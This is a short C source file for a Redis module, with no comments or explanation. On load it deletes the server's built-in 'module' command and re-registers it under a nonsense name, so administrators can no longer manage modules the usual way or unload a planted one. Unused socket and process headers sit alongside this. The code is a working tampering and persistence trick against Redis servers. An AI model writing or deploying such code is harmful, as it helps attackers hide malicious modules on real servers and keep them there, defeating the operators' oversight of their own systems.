#include "../redismodule.h"
#include "../server.h"

#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <execinfo.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    int retval;
    const char *name="module";
    const char *newname="modulelalalalalalala";
    sds module_command = sdsnew(name);
    sds new_module_command = sdsnew(newname);

    struct redisCommand *cmd = lookupCommand(module_command);
    if (!cmd) {
        sdsfree(module_command);
        sdsfree(new_module_command);
        return REDISMODULE_ERR;
    }
    retval = dictDelete(server.commands, module_command);
    sds copy = sdsdup(new_module_command);

    retval = dictAdd(server.commands, copy, cmd);
    if (retval != DICT_OK) {
        sdsfree(module_command);
        sdsfree(new_module_command);
        sdsfree(copy);
        return REDISMODULE_ERR;
    }
    if (RedisModule_Init(ctx,"module_load",1,REDISMODULE_APIVER_1)
                        == REDISMODULE_ERR) return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
